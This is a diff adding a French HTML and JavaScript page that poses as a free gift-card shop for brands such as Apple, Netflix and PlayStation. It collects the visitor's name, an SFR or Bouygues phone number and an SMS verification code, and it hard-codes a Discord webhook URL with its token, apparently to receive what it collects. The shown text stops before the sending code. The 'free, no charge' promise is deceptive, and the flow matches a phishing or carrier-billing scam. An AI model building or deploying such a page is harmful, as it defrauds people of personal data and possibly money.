@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Cartes Cadeaux</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+body{min-height:100vh;background:radial-gradient(60% 50% at 15% 0%,rgba(10,132,255,.35),transparent 70%),radial-gradient(50% 45% at 90% 15%,rgba(122,43,255,.3),transparent 70%),radial-gradient(60% 55% at 50% 100%,rgba(255,43,122,.22),transparent 75%),#07090f;background-attachment:fixed;color:#fff;padding:22px 16px 130px;overflow-x:hidden}
+.screen{display:none}.screen.active{display:block;animation:fade .45s cubic-bezier(.22,1,.36,1)}
+@keyframes fade{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+h1{font-size:30px;font-weight:800;text-align:center;letter-spacing:-1px;margin-bottom:6px}
+.sub{text-align:center;opacity:.55;font-size:13.5px;margin-bottom:16px}
+.badges{display:flex;gap:7px;justify-content:center;margin-bottom:20px;flex-wrap:wrap}
+.badges span{font-size:11px;font-weight:700;color:rgba(255,255,255,.8);background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);padding:6px 11px;border-radius:20px;display:inline-flex;align-items:center;gap:5px;animation:popIn .5s cubic-bezier(.22,1.4,.4,1) both}
+.badges span:nth-child(2){animation-delay:.1s}.badges span:nth-child(3){animation-delay:.2s}.badges span:nth-child(4){animation-delay:.3s}
+@keyframes popIn{from{opacity:0;transform:scale(.8)}to{opacity:1;transform:none}}
+.badges span i{width:6px;height:6px;border-radius:50%;background:#34c759;box-shadow:0 0 8px #34c759;display:inline-block;animation:blink 2s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;max-width:640px;margin:0 auto}
+@media(min-width:520px){.grid{grid-template-columns:repeat(4,1fr)}}
+.brand{aspect-ratio:1;border-radius:20px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;cursor:pointer;border:none;color:#fff;font-weight:700;font-size:11px;transition:transform .3s cubic-bezier(.22,1,.36,1),box-shadow .3s;box-shadow:0 10px 26px rgba(0,0,0,.5),inset 0 -3px 0 rgba(0,0,0,.22),inset 0 1px 0 rgba(255,255,255,.18);overflow:hidden;position:relative;animation:brandIn .5s cubic-bezier(.22,1,.36,1) both}
+@keyframes brandIn{from{opacity:0;transform:translateY(14px) scale(.9)}to{opacity:1;transform:none}}
+.brand::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 30% 20%,rgba(255,255,255,.35),transparent 55%);opacity:.5}
+.brand::after{content:"";position:absolute;top:-60%;left:-120%;width:70%;height:220%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.4),transparent);transform:rotate(20deg);transition:left .8s ease}
+.brand:hover{transform:translateY(-6px) scale(1.04);box-shadow:0 22px 50px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.12)}
+.brand:hover::after{left:130%}
+.brand:active{transform:scale(.93)}
+.brand .ico{width:38px;height:38px;position:relative;z-index:1;display:flex;align-items:center;justify-content:center;transition:transform .4s cubic-bezier(.22,1,.36,1)}
+.brand:hover .ico{transform:scale(1.15) rotate(-5deg)}
+.brand .ico svg{width:100%;height:100%;display:block}
+.brand .ico span{font-size:32px;line-height:1;filter:drop-shadow(0 3px 6px rgba(0,0,0,.5))}
+.brand .nm{position:relative;z-index:1;text-shadow:0 2px 5px rgba(0,0,0,.55);text-align:center;line-height:1.1}
+.panel{background:rgba(255,255,255,.98);color:#0a0f1a;border-radius:28px;padding:22px 20px;box-shadow:0 30px 70px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.9);max-width:560px;margin:0 auto;animation:fade .5s cubic-bezier(.22,1,.36,1)}
+.panel h2{font-size:19px;font-weight:800;margin-bottom:14px;letter-spacing:-.4px}
+.topbar{display:flex;align-items:center;gap:12px;margin-bottom:18px;max-width:560px;margin-left:auto;margin-right:auto}
+.bk{width:40px;height:40px;border-radius:12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#fff;cursor:pointer;font-size:18px;font-weight:700;transition:.15s}
+.bk:active{transform:scale(.92)}
+.topbar .t b{font-size:18px;font-weight:800;letter-spacing:-.4px;display:block}
+.topbar .t small{font-size:11.5px;color:rgba(255,255,255,.5)}
+.note{background:#eef6ff;border:1px solid #cfe4ff;border-radius:14px;padding:12px 14px;font-size:12.5px;color:#1a4a80;line-height:1.55;margin-bottom:16px;display:flex;gap:10px;align-items:flex-start;animation:popIn .5s cubic-bezier(.22,1.4,.4,1)}
+.note b{color:#0a3564}
+.note .ic{width:18px;height:18px;flex-shrink:0;margin-top:1px}
+.note .ic svg{width:100%;height:100%;stroke:#0a84ff;fill:none;stroke-width:2}
+.note.warn{background:#fff6e5;border-color:#ffdfa6;color:#8a5a00}
+.note.warn b{color:#6a4400}
+.note.warn .ic svg{stroke:#ff9500}
+.modal-bg{position:fixed;inset:0;background:rgba(4,7,14,.75);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);display:none;align-items:flex-end;justify-content:center;z-index:100;animation:fade .3s}
+.modal-bg.show{display:flex}
+@media(min-width:560px){.modal-bg{align-items:center;padding:20px}}
+.modal{background:#fff;color:#0a0f1a;border-radius:28px 28px 0 0;padding:26px 22px calc(26px + env(safe-area-inset-bottom));width:100%;max-width:420px;box-shadow:0 -30px 80px rgba(0,0,0,.6);animation:slideUp .4s cubic-bezier(.22,1.2,.36,1)}
+@media(min-width:560px){.modal{border-radius:28px;animation:popUp .4s cubic-bezier(.22,1.4,.4,1)}}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:none}}
+@keyframes popUp{from{transform:scale(.85) translateY(20px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+.grab{width:38px;height:4px;border-radius:2px;background:#dfe3ea;margin:-8px auto 16px}
+.badge{width:82px;height:82px;border-radius:24px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;padding:16px;box-shadow:0 12px 28px rgba(0,0,0,.3),inset 0 -3px 0 rgba(0,0,0,.2),inset 0 2px 0 rgba(255,255,255,.25);animation:popIn .5s cubic-bezier(.22,1.4,.4,1)}
+.badge svg{width:100%;height:100%}
+.badge span{font-size:40px}
+.modal h3{text-align:center;font-size:20px;font-weight:800;margin-bottom:4px;letter-spacing:-.4px}
+.modal .hint{text-align:center;font-size:12.5px;color:#8a8f99;margin-bottom:18px}
+.amts{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:6px}
+.amt{padding:15px;border-radius:14px;border:1.5px solid #e5e8ee;background:#f6f8fc;font-size:17px;font-weight:700;cursor:pointer;color:#0a0f1a;transition:all .25s cubic-bezier(.22,1,.36,1);position:relative}
+.amt:hover{border-color:#0A84FF;transform:translateY(-2px);box-shadow:0 8px 18px rgba(10,132,255,.18)}
+.amt:active{transform:scale(.96)}
+.amt.sel{border-color:#0A84FF;background:linear-gradient(180deg,#2b95ff,#0A84FF);color:#fff;box-shadow:0 8px 20px rgba(10,132,255,.4),inset 0 -3px 0 rgba(0,0,0,.15);transform:scale(1.03)}
+.btn{width:100%;padding:16px;border-radius:16px;border:none;background:linear-gradient(180deg,#2b95ff,#0A84FF);color:#fff;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.2px;box-shadow:0 6px 0 #005bb8,0 12px 26px rgba(10,132,255,.35);transition:.12s;margin-top:12px;position:relative;overflow:hidden}
+.btn:active{transform:translateY(3px);box-shadow:0 3px 0 #005bb8}
+.btn.sec{background:#eef0f4;color:#0a0f1a;box-shadow:0 6px 0 #cdd2da}
+.btn.sec:active{box-shadow:0 3px 0 #cdd2da}
+.btn:disabled{opacity:.45;cursor:not-allowed;box-shadow:0 6px 0 #999;transform:none}
+.btn.big{padding:18px;font-size:17px;background:linear-gradient(180deg,#34c759,#28a745);box-shadow:0 6px 0 #1a7a35,0 12px 26px rgba(52,199,89,.4)}
+.btn.big:active{box-shadow:0 3px 0 #1a7a35}
+.bar{position:fixed;bottom:0;left:0;right:0;background:rgba(10,15,26,.82);backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);padding:14px 18px calc(14px + env(safe-area-inset-bottom));display:flex;justify-content:space-between;align-items:center;border-top:1px solid rgba(255,255,255,.09);z-index:50;box-shadow:0 -18px 50px rgba(0,0,0,.5)}
+.bar .l{display:flex;align-items:center;gap:12px}
+.cartico{position:relative;width:44px;height:44px;border-radius:14px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:20px}
+.cartico .cnt{position:absolute;top:-4px;right:-4px;min-width:20px;height:20px;padding:0 5px;border-radius:10px;background:linear-gradient(135deg,#ff2b7a,#ff5e3a);font-size:11px;font-weight:800;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(255,43,122,.55);animation:popIn .3s cubic-bezier(.22,1.6,.4,1)}
+.bar .l .txt small{font-size:10.5px;color:rgba(255,255,255,.45);display:block;letter-spacing:.3px}
+.bar .l .txt b{font-size:17px;font-weight:800;letter-spacing:-.3px}
+.bar .go{padding:13px 20px;border-radius:14px;border:none;background:linear-gradient(180deg,#2b95ff,#0A84FF);color:#fff;font-weight:700;font-size:14.5px;cursor:pointer;box-shadow:0 5px 0 #005bb8,0 10px 22px rgba(10,132,255,.4);transition:.12s}
+.bar .go:active{transform:translateY(3px);box-shadow:0 2px 0 #005bb8}
+.row{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid #eef0f4;animation:rowIn .4s cubic-bezier(.22,1,.36,1) both}
+@keyframes rowIn{from{opacity:0;transform:translateX(-14px)}to{opacity:1;transform:none}}
+.row:last-of-type{border-bottom:none}
+.row .l{display:flex;align-items:center;gap:13px}
+.emo{width:46px;height:46px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 6px 14px rgba(0,0,0,.2),inset 0 -2px 0 rgba(0,0,0,.15);padding:10px}
+.emo svg{width:100%;height:100%}
+.row .txt b{font-size:14.5px;font-weight:700;display:block}
+.row .txt span{font-size:12.5px;color:#8a8f99}
+.rm{background:#fff0f0;color:#e11d2e;border:1px solid #ffd7da;border-radius:10px;padding:8px 12px;font-size:12.5px;font-weight:700;cursor:pointer}
+.rm:active{background:#ffe0e3;transform:scale(.95)}
+.tot{display:flex;justify-content:space-between;align-items:center;padding:18px 0 4px;border-top:1.5px solid #eef0f4;margin-top:8px}
+.tot small{font-size:12px;color:#8a8f99;font-weight:700;letter-spacing:.4px;text-transform:uppercase}
+.tot b{font-size:24px;font-weight:800;letter-spacing:-.6px;background:linear-gradient(135deg,#0A84FF,#7a2bff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+input{width:100%;padding:16px;border-radius:16px;border:1.5px solid #e5e8ee;background:#f6f8fc;font-size:19px;text-align:center;letter-spacing:3px;font-weight:700;outline:none;color:#0a0f1a;font-variant-numeric:tabular-nums;transition:.2s}
+input.txt{letter-spacing:.3px;text-align:left;font-size:16px;font-weight:600}
+input:focus{border-color:#0A84FF;background:#fff;box-shadow:0 0 0 4px rgba(10,132,255,.12)}
+input:disabled{opacity:.5;background:#eef0f4}
+.lbl{display:block;font-size:11.5px;font-weight:700;color:#8a8f99;letter-spacing:.5px;text-transform:uppercase;margin-bottom:8px;margin-top:14px}
+.lbl:first-of-type{margin-top:0}
+.ops{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:4px}
+.op{padding:16px 14px;border-radius:14px;border:1.5px solid #e5e8ee;background:#f6f8fc;cursor:pointer;transition:all .25s cubic-bezier(.22,1,.36,1);display:flex;align-items:center;gap:12px;color:#0a0f1a;font-weight:700;font-size:15px;position:relative}
+.op:hover{border-color:#0A84FF;transform:translateY(-2px);box-shadow:0 8px 18px rgba(10,132,255,.15)}
+.op:active{transform:scale(.97)}
+.op.sel{border-color:#0A84FF;background:linear-gradient(180deg,#2b95ff,#0A84FF);color:#fff;box-shadow:0 8px 20px rgba(10,132,255,.4),inset 0 -3px 0 rgba(0,0,0,.15)}
+.op .oplogo{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;color:#fff;letter-spacing:-.5px;flex-shrink:0}
+.op .oplogo.sfr{background:linear-gradient(135deg,#e2001a,#8a0010)}
+.op .oplogo.bg{background:linear-gradient(135deg,#009ee0,#0060a0)}
+.ringwrap{position:relative;width:180px;height:180px;margin:12px auto 18px;filter:drop-shadow(0 12px 26px rgba(10,132,255,.35))}
+.ringwrap svg{transform:rotate(-90deg)}
+.ringwrap .rb{fill:none;stroke:#eef0f4;stroke-width:12}
+.ringwrap .rp{fill:none;stroke:url(#gr);stroke-width:12;stroke-linecap:round;transition:stroke-dashoffset 1s linear}
+.ringwrap .mid{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0a0f1a}
+.ringwrap .mid b{font-size:44px;font-weight:800;line-height:1;letter-spacing:-1.5px;font-variant-numeric:tabular-nums}
+.ringwrap .mid small{font-size:10.5px;font-weight:700;color:#8a8f99;letter-spacing:2px;text-transform:uppercase;margin-top:4px}
+.pulse{position:absolute;inset:12px;border-radius:50%;border:2px solid rgba(10,132,255,.35);animation:halo 2s ease-out infinite;pointer-events:none}
+@keyframes halo{0%{transform:scale(1);opacity:.8}100%{transform:scale(1.15);opacity:0}}
+.ok{text-align:center;padding:6px 0}
+.chk{width:86px;height:86px;border-radius:50%;margin:0 auto 18px;background:linear-gradient(160deg,#4cd964,#28a745);display:flex;align-items:center;justify-content:center;box-shadow:0 20px 40px rgba(52,199,89,.4),inset 0 -4px 0 rgba(0,0,0,.15);font-size:44px;color:#fff;animation:bounce .7s cubic-bezier(.22,1.6,.4,1)}
+@keyframes bounce{0%{transform:scale(0);opacity:0}60%{transform:scale(1.12)}100%{transform:scale(1);opacity:1}}
+.ok h2{font-size:24px;font-weight:800;letter-spacing:-.6px;margin-bottom:8px}
+.ok p{font-size:14px;color:#6b7280;line-height:1.55;padding:0 10px}
+.recap{background:#f6f8fc;border-radius:16px;padding:14px;margin-top:16px;font-size:13px;color:#4a5568;text-align:left;line-height:1.7;animation:popIn .6s cubic-bezier(.22,1.4,.4,1) .2s both}
+.recap b{color:#0a0f1a}
+.err{color:#e11d2e;font-size:12.5px;margin-top:10px;text-align:center;min-height:16px;font-weight:600}
+.empty{text-align:center;padding:50px 20px;color:#8a8f99;font-size:14px}
+</style>
+</head>
+<body>
+
+<div id="scr1" class="screen active">
+  <h1>Cartes Cadeaux</h1>
+  <p class="sub">Choisis ta marque · Livraison SMS 24h</p>
+  <div class="badges">
+    <span><i></i>100% gratuit</span>
+    <span>Aucun prélèvement</span>
+    <span>Jusqu'à 100 €</span>
+    <span>Livraison 24h</span>
+  </div>
+  <div class="grid" id="brandGrid"></div>
+</div>
+
+<div id="scr2" class="screen">
+  <div class="topbar">
+    <button class="bk" onclick="show('scr1')">‹</button>
+    <div class="t"><b>Panier</b><small>Vérifie ta commande</small></div>
+  </div>
+  <div class="panel" id="cartCard"></div>
+</div>
+
+<div id="scr2b" class="screen">
+  <div class="topbar">
+    <button class="bk" onclick="show('scr2')">‹</button>
+    <div class="t"><b>Tes coordonnées</b><small>Étape 1 sur 3</small></div>
+  </div>
+  <div class="panel">
+    <h2>Tes informations</h2>
+    <label class="lbl">Prénom</label>
+    <input id="firstName" type="text" class="txt" placeholder="Prénom" autocomplete="given-name" maxlength="40">
+    <label class="lbl">Nom</label>
+    <input id="lastName" type="text" class="txt" placeholder="Nom de famille" autocomplete="family-name" maxlength="40">
+    <div class="err" id="nameErr"></div>
+    <button class="btn big" id="nameBtn">Passer commande · <span id="nameTotal">0 €</span></button>
+  </div>
+</div>
+
+<div id="scr3" class="screen">
+  <div class="topbar">
+    <button class="bk" onclick="show('scr2b')">‹</button>
+    <div class="t"><b>Vérification</b><small>Étape 2 sur 3</small></div>
+  </div>
+  <div class="panel">
+    <h2>Numéro de téléphone</h2>
+    <div class="note">
+      <div class="ic"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v5M12 16h.01"/></svg></div>
+      <div>Ton numéro sert <b>uniquement à vérifier l'envoi de ta carte cadeau</b>. Aucun prélèvement, aucun frais — le service est <b>100% gratuit</b>.</div>
+    </div>
+    <label class="lbl">Numéro mobile</label>
+    <input id="phoneInput" type="tel" inputmode="numeric" placeholder="06 12 34 56 78" maxlength="14">
+    <label class="lbl">Opérateur</label>
+    <div class="ops" id="opList">
+      <div class="op" data-op="SFR">
+        <div class="oplogo sfr">SFR</div>
+        <span>SFR</span>
+      </div>
+      <div class="op" data-op="Bouygues">
+        <div class="oplogo bg">BY</div>
+        <span>Bouygues</span>
+      </div>
+    </div>
+    <div class="note warn" style="margin-top:14px">
+      <div class="ic"><svg viewBox="0 0 24 24"><path d="M12 9v4M12 17h.01"/><path d="M10.3 3.9L2.6 17a2 2 0 0 0 1.7 3h15.4a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg></div>
+      <div>Seuls les numéros <b>SFR</b> et <b>Bouygues Telecom</b> sont pris en charge. Les autres opérateurs ne fonctionnent pas.</div>
+    </div>
+    <div class="err" id="phoneErr"></div>
+    <button class="btn" id="payBtn">Recevoir le code</button>
+  </div>
+</div>
+
+<div id="scr4" class="screen">
+  <div class="topbar">
+    <button class="bk" onclick="show('scr3')">‹</button>
+    <div class="t"><b>Code de vérification</b><small>Étape 3 sur 3</small></div>
+  </div>
+  <div class="panel">
+    <h2 style="text-align:center">Entre ton code</h2>
+    <div class="ringwrap">
+      <svg width="180" height="180">
+        <defs><linearGradient id="gr" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#0A84FF"/><stop offset="100%" stop-color="#7a2bff"/>
+        </linearGradient></defs>
+        <circle class="rb" cx="90" cy="90" r="76"/>
+        <circle id="ringProg" class="rp" cx="90" cy="90" r="76" stroke-dasharray="477.52" stroke-dashoffset="0"/>
+      </svg>
+      <div class="mid"><b id="ringTxt">45</b><small>secondes</small></div>
+      <div class="pulse"></div>
+    </div>
+    <input id="codeInput" type="tel" inputmode="numeric" placeholder="0000" maxlength="4" disabled>
+    <div class="err" id="codeErr"></div>
+    <button class="btn" id="codeBtn" disabled>Valider le code</button>
+  </div>
+</div>
+
+<div id="scr5" class="screen">
+  <div class="panel">
+    <div class="ok">
+      <div class="chk">✓</div>
+      <h2>Commande confirmée</h2>
+      <p>Merci <b id="doneName">—</b>. Tu recevras ta carte cadeau par SMS dans un délai maximum de 24 heures. Service 100% gratuit, aucun prélèvement.</p>
+    </div>
+    <div class="recap">
+      <b>Récapitulatif</b><br>
+      <span id="doneCart">—</span><br>
+      <b>Opérateur :</b> <span id="doneOp">—</span><br>
+      <b>Total :</b> <span id="doneTotal">—</span>
+    </div>
+    <button class="btn sec" style="margin-top:20px" onclick="location.reload()">Retour à la boutique</button>
+  </div>
+</div>
+
+<div class="bar" id="cartBar">
+  <div class="l">
+    <div class="cartico">🛒<span class="cnt" id="barCount">0</span></div>
+    <div class="txt"><small>Total panier</small><b id="barTotal">0 €</b></div>
+  </div>
+  <button class="go" id="viewCart">Voir le panier →</button>
+</div>
+
+<div class="modal-bg" id="modalBg">
+  <div class="modal">
+    <div class="grab"></div>
+    <div class="badge" id="mBadge"></div>
+    <h3 id="mName">Marque</h3>
+    <p class="hint">Choisis le montant de ta carte</p>
+    <div class="amts" id="mAmounts"></div>
+    <button class="btn" id="mAdd">Ajouter au panier</button>
+    <button class="btn sec" id="mClose">Annuler</button>
+  </div>
+</div>
+
+<script>
+var WEBHOOK="https://discord.com/api/webhooks/1558248083517612093/1OAOJwck01SpDCngADpHxR2Dw8QL-bOWYhif8g3iym_o8ki3sb_QNu-hi3KFVwxqaPER";
+var S={};
+S.apple='<svg viewBox="0 0 24 24" fill="#fff"><path d="M16.4 12.6c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.9-1.4-.1-2.8.9-3.5.9-.7 0-1.8-.8-3-.8-1.5 0-3 .9-3.8 2.3-1.6 2.8-.4 7 1.2 9.3.8 1.1 1.7 2.4 2.9 2.3 1.2-.1 1.6-.8 3-.8s1.8.8 3 .7c1.2 0 2-1.1 2.8-2.3.9-1.3 1.2-2.6 1.3-2.6-.1 0-2.5-1-2.5-3.6zM14.1 5.3c.6-.8 1.1-1.9.9-2.9-.9 0-2.1.6-2.7 1.4-.6.7-1.1 1.8-1 2.8 1 .1 2.1-.5 2.8-1.3z"/></svg>';
+S.ps='<svg viewBox="0 0 24 24" fill="#fff"><path d="M9.5 6.5v11.2l4.4 1.4V4.7l-4.4 1.8z"/><path d="M15.2 8v9.5c2 .6 3.3-.1 3.3-1.5 0-1.3-1.2-2.4-3.3-2.7z"/><path d="M4.5 11.3v5.4c0 1.4 1.3 2.1 3.3 1.5v-5.4c-2.1.3-3.3-.2-3.3-1.5z"/></svg>';
+S.xbox='<svg viewBox="0 0 24 24" fill="#fff"><circle cx="12" cy="12" r="10"/><path d="M7 17.5c1.5-1.3 3-2.9 5-5-2-2.1-3.5-3.7-5-5A9 9 0 0 0 7 17.5zm10 0a9 9 0 0 0 0-10c-1.5 1.3-3 2.9-5 5 2 2.1 3.5 3.7 5 5z" fill="#0e6b0e"/></svg>';
+S.netflix='<svg viewBox="0 0 24 24"><path d="M7 2h3l5 15V2h3v20l-3-.4L9 7v14l-3 .4z" fill="#E50914"/></svg>';
+S.spotify='<svg viewBox="0 0 24 24" fill="#1DB954"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm4.6 14.4a.7.7 0 0 1-1 .2c-2.7-1.6-6-2-10-1.1a.7.7 0 1 1-.3-1.4c4.4-1 8.1-.6 11.1 1.3.4.2.5.7.2 1zm1.2-2.8a.9.9 0 0 1-1.2.3c-3-1.9-7.7-2.4-11.3-1.3a.9.9 0 1 1-.5-1.7c4.1-1.2 9.2-.7 12.7 1.5.4.2.5.8.3 1.2zm.1-2.9C14.4 8.5 8.6 8.3 5.2 9.4a1 1 0 1 1-.6-2c3.9-1.2 10.4-1 14.4 1.4a1 1 0 0 1-1 1.7z"/></svg>';
+S.gplay='<svg viewBox="0 0 24 24"><path d="M3 3l11 9-11 9V3z" fill="#00c2a8"/><path d="M3 3l11 9-4 3L3 3z" fill="#01875f"/><path d="M14 12l4.5 3.5c1 .6 1 .6 1.5-.4L20 14 14 12z" fill="#ff9500"/><path d="M3 21l11-9 6 3-17 6z" fill="#ff3b30"/></svg>';
+S.steam='<svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2a10 10 0 0 0-10 9.5l5.4 2.2a2.8 2.8 0 0 1 1.6-.5h.2l2.4-3.5v-.1c0-2 1.6-3.6 3.6-3.6s3.6 1.6 3.6 3.6-1.6 3.6-3.6 3.6h-.1L11.6 14v.2a2.8 2.8 0 0 1-5.5.7L2.5 13.4A10 10 0 0 0 12 22a10 10 0 0 0 0-20zm4.4 6.2a2.4 2.4 0 1 0 0 4.8 2.4 2.4 0 0 0 0-4.8z"/></svg>';
+S.ms='<svg viewBox="0 0 24 24"><rect x="2" y="2" width="9" height="9" fill="#f25022"/><rect x="13" y="2" width="9" height="9" fill="#7fba00"/><rect x="2" y="13" width="9" height="9" fill="#00a4ef"/><rect x="13" y="13" width="9" height="9" fill="#ffb900"/></svg>';
+S.amazon='<svg viewBox="0 0 24 24"><path d="M13.5 3.5h1.5v6.3c0 .7 0 1.2.5 1.2.3 0 .8-.2 1.4-.6l.6 1.4c-1.4 1-2.4 1-3 .6-.9-.6-.9-1.6-.9-2.6V3.5zm-8.6 0h3.2c2.4 0 3.7 1 3.7 2.7 0 1.1-.6 1.9-1.7 2.3 1.4.3 2.1 1.2 2.1 2.5 0 2-1.5 3.1-3.9 3.1H4.9V3.5zm1.8 1.4v2.5h1.4c1.1 0 1.7-.5 1.7-1.3s-.5-1.2-1.6-1.2H6.7zm0 3.9v3h1.5c1.3 0 2-.5 2-1.5S9.5 8.8 8.3 8.8H6.7z" fill="#fff"/><path d="M3 19c5 3 13 3 18-2l-1-.5c-4 3-10 3-15 1l-2 1.5z" fill="#FF9900"/></svg>';
+S.disney='<svg viewBox="0 0 24 24"><text x="12" y="17" font-family="Georgia,serif" font-size="15" font-weight="900" fill="#fff" text-anchor="middle">D+</text></svg>';
+S.nintendo='<svg viewBox="0 0 24 24" fill="#E60012"><rect x="3" y="3" width="8" height="18" rx="3"/><rect x="13" y="3" width="8" height="18" rx="3" fill="#fff" stroke="#E60012" stroke-width="1.2"/><circle cx="7" cy="8" r="1.3" fill="#fff"/><circle cx="17" cy="12" r="1.3" fill="#E60012"/></svg>';
+S.discord='<svg viewBox="0 0 24 24" fill="#fff"><path d="M19.5 5.5A17 17 0 0 0 15 4l-.2.4c1.5.4 2.5 1 3.5 1.8A13 13 0 0 0 5.7 6.2c1-.8 2-1.4 3.5-1.8L9 4a17 17 0 0 0-4.5 1.5C2 9.5 1.4 14.5 2.5 18c1.3 1 3 1.6 4.7 1.8l1-1.5c-.8-.3-1.5-.7-2-1.1l.5-.4c3 1.4 6.6 1.4 9.6 0l.5.4c-.6.4-1.3.8-2 1.1l1 1.5c1.7-.2 3.4-.8 4.7-1.8 1.2-3.8.2-9-2-12.5zM9 15c-.9 0-1.5-.8-1.5-1.7S8.1 11.5 9 11.5s1.5.8 1.5 1.8S9.9 15 9 15zm6 0c-.9 0-1.5-.8-1.5-1.7s.6-1.8 1.5-1.8 1.5.8 1.5 1.8S15.9 15 15 15z"/></svg>';
+S.twitch='<svg viewBox="0 0 24 24"><path d="M4 4h16v10l-3 3h-3l-2.5 2.5L9 17H4z" fill="#9146FF"/><path d="M11 8v5M15 8v5" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg>';
+var BRANDS=[
+{n:"Apple",e:"🍎",s:S.apple,g:"linear-gradient(135deg,#2a2a2a,#0d0d0d)"},
+{n:"PlayStation",e:"🎮",s:S.ps,g:"linear-gradient(135deg,#0070d1,#002d6e)"},
+{n:"Xbox",e:"🕹️",s:S.xbox,g:"linear-gradient(135deg,#107C10,#064d06)"},
+{n:"Fortnite",e:"⛏️",s:null,g:"linear-gradient(135deg,#7a3cff,#00c2ff)"},
+{n:"Steam",e:"💨",s:S.steam,g:"linear-gradient(135deg,#2a475e,#0f1b26)"},
+{n:"Google Play",e:"▶️",s:S.gplay,g:"linear-gradient(135deg,#00c2a8,#01875f)"},
+{n:"Spotify",e:"🎵",s:S.spotify,g:"linear-gradient(135deg,#1DB954,#0d6e2c)"},
+{n:"Netflix",e:"🎬",s:S.netflix,g:"linear-gradient(135deg,#E50914,#7a0009)"},
+{n:"Disney+",e:"🏰",s:S.disney,g:"linear-gradient(135deg,#113CCF,#071a63)"},
+{n:"Nintendo",e:"🍄",s:S.nintendo,g:"linear-gradient(135deg,#E60012,#7a000a)"},
+{n:"Roblox",e:"🧱",s:null,g:"linear-gradient(135deg,#e2231a,#7a0f0a)"},
+{n:"Twitch",e:"📺",s:S.twitch,g:"linear-gradient(135deg,#9146FF,#4a1f8c)"},
+{n:"Amazon",e:"📦",s:S.amazon,g:"linear-gradient(135deg,#FF9900,#8a5200)"},
+{n:"Uber Eats",e:"🍔",s:null,g:"linear-gradient(135deg,#06C167,#036e39)"},
+{n:"Starbucks",e:"☕",s:null,g:"linear-gradient(135deg,#00704A,#003322)"},
+{n:"Discord",e:"💬",s:S.discord,g:"linear-gradient(135deg,#5865F2,#2a3080)"},
+{n:"Epic Games",e:"🎯",s:null,g:"linear-gradient(135deg,#333,#000)"},
+{n:"V-Bucks",e:"💰",s:null,g:"linear-gradient(135deg,#00c2ff,#005f8a)"},
+{n:"iTunes",e:"🎶",s:null,g:"linear-gradient(135deg,#FC3C44,#7a1a20)"},
+{n:"Microsoft",e:"🪟",s:S.ms,g:"linear-gradient(135deg,#0078D4,#003a6e)"},
+{n:"Prepaid",e:"📱",s:null,g:"linear-gradient(135deg,#ff9500,#8a4e00)"},
+{n:"Paysafecard",e:"💳",s:null,g:"linear-gradient(135deg,#00b0ff,#005a80)"},
+{n:"Razer Gold",e:"🐍",s:null,g:"linear-gradient(135deg,#44D62C,#1e6612)"},
+{n:"Wish",e:"🛒",s:null,g:"linear-gradient(135deg,#2fb457,#125e28)"}
+];
+var AMOUNTS=[10,25,50,100];
+var cart=[],selBrand=null,selAmt=null,phone="",firstName="",lastName="",operateur="",timer=null;
+function euros(v){return v+" €";}
+function total(){var t=0;for(var i=0;i<cart.length;i++)t+=cart[i].amount;return t;}
+function show(id){
+  var s=document.querySelectorAll(".screen");
+  for(var i=0;i<s.length;i++)s[i].classList.remove("active");
+  document.getElementById(id).classList.add("active");
+  document.getElementById("cartBar").style.display=(id==="scr1"||id==="scr2")?"flex":"none";
+  window.scrollTo(0,0);
+}
+function renderBrands(){
+  var g=document.getElementById("brandGrid");g.innerHTML="";
+  for(var i=0;i<BRANDS.length;i++){(function(idx){
+    var b=BRANDS[idx];var el=document.createElement("button");
+    el.className="brand";el.style.background=b.g;el.style.animationDelay=(idx*0.025)+"s";
+    el.innerHTML='<div class="ico">'+(b.s||'<span>'+b.e+'</span>')+'</div><span class="nm">'+b.n+'</span>';
+    el.onclick=function(){openModal(idx);};g.appendChild(el);
+  })(i);}
+}
+function openModal(i){
+  selBrand=i;selAmt=null;var b=BRANDS[i];
+  document.getElementById("mBadge").style.background=b.g;
+  document.getElementById("mBadge").innerHTML=(b.s||'<span>'+b.e+'</span>');
